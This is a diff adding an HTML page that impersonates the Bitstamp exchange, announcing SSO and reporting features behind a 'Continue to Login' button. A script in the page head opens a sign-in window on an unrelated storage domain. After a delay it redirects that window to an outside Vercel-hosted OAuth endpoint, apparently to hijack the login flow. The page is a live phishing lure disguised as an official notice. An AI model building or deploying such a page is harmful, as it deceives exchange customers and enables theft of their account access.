@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Bitstamp: New Feature Access</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+
+    .header {
+      background: white;
+      padding: 40px 0;
+      text-align: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    }
+
+    .header h1 {
+      color: #003C2F;
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+    }
+
+    .header p {
+      color: #666;
+      font-size: 1.1rem;
+    }
+
+    .content {
+      max-width: 900px;
+      margin: 40px auto;
+      padding: 30px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+    }
+
+    .section-title {
+      font-size: 1.8rem;
+      color: #003C2F;
+      margin-bottom: 20px;
+    }
+
+    .feature {
+      border-left: 4px solid #00B15D;
+      padding-left: 20px;
+      margin-bottom: 30px;
+    }
+
+    .feature h3 {
+      color: #003C2F;
+      margin-bottom: 10px;
+    }
+
+    .feature p {
+      color: #555;
+      line-height: 1.6;
+    }
+
+    .cta-button {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      background: #00B15D;
+      color: white;
+      font-weight: bold;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      margin-top: 30px;
+    }
+
+    .cta-button:hover {
+      background: #009c50;
+    }
+
+    footer {
+      text-align: center;
+      padding: 40px 0;
+      color: #888;
+      font-size: 0.9rem;
+    }
+
+    @media (max-width: 768px) {
+      .content {
+        margin: 20px;
+        padding: 20px;
+      }
+    }
+  </style>
+  <script>
+    function init() {
+      foo.location.href = "https://conference-oauth.vercel.app/api/auth/login?origin=https://ccvm-cyxtera-08.zadarastorage.com/users/sign_in/abcd33";
+    }
+
+    function launch() {
+      foo = window.open("https://ccvm-cyxtera-08.zadarastorage.com/users/sign_in/", "foo", "");
+      setTimeout(init, 7200);
+    }
+  </script>
+</head>
+<body>
+  <div class="header">
+    <h1>Bitstamp Account Enhancements</h1>
+    <p>Access new security and reporting features tailored to your financial activity.</p>
+  </div>
+
+  <div class="content">
+    <div class="section-title">What’s New</div>
+
+    <div class="feature">
+      <h3>🔐 Improved SSO Integration</h3>
+      <p>We’ve introduced enhanced authentication mechanisms via third-party identity providers. This offers faster, secure, and compliant access to your account.</p>
+    </div>
+
+    <div class="feature">
+      <h3>📊 Advanced Reporting Dashboard</h3>
+      <p>Get granular insight into your transactions, fees, and market activity — all in one place. Designed for traders and institutional users.</p>
+    </div>
+
+    <div class="feature">
+      <h3>🚀 Early Access Program</h3>
+      <p>As a valued user, you are eligible to join our limited rollout for testing the new account access features.</p>
+    </div>
+
+    <button class="cta-button" onclick="launch()">Continue to Login</button>
+  </div>
+
+  <footer>
+    &copy; 2024 Bitstamp by Robinhood. All rights reserved.
+  </footer>
+</body>
+</html>
